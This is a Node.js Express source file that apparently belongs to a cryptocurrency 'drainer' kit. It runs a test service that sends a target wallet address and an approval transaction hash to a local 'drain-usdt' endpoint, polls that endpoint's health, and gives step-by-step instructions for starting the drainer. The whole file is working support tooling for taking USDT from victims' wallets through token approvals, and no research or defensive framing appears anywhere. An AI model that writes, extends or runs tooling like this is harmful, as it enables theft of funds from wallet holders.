const express = require('express');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json());

// Test drainer endpoint
app.post('/test-drain', async (req, res) => {
  const { userAddress } = req.body;
  
  console.log(`🧪 TESTING DRAINER for: ${userAddress}`);
  
  try {
    // Call the actual drainer service
    const response = await fetch('http://localhost:3002/drain-usdt', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        userAddress: userAddress,
        approvalTxHash: '0xtest123'
      })
    });
    
    const result = await response.json();
    
    console.log('✅ Drainer test result:', result);
    
    res.json({
      success: true,
      message: 'Drainer test completed',
      drainerResponse: result,
      testAddress: userAddress
    });
    
  } catch (error) {
    console.error('❌ Drainer test failed:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Check drainer status
app.get('/drainer-status', async (req, res) => {
  try {
    const response = await fetch('http://localhost:3002/health');
    const status = await response.json();
    
    res.json({
      drainerRunning: true,
      status: status,
      testInstructions: {
        step1: 'Start drainer: cd drainer && node drainer.js',
        step2: 'Test drain: POST /test-drain with {"userAddress": "0x..."}',
        step3: 'Check logs in drainer console'
      }
    });
    
  } catch (error) {
    res.json({
      drainerRunning: false,
      error: 'Drainer service not running',
      instructions: 'Run: cd drainer && node drainer.js'
    });
  }
});

const PORT = 3003;
app.listen(PORT, () => {
  console.log(`🧪 Drainer Test Service running on port ${PORT}`);
  console.log(`📋 Test endpoints:`);
  console.log(`   GET  http://localhost:${PORT}/drainer-status`);
  console.log(`   POST http://localhost:${PORT}/test-drain`);
});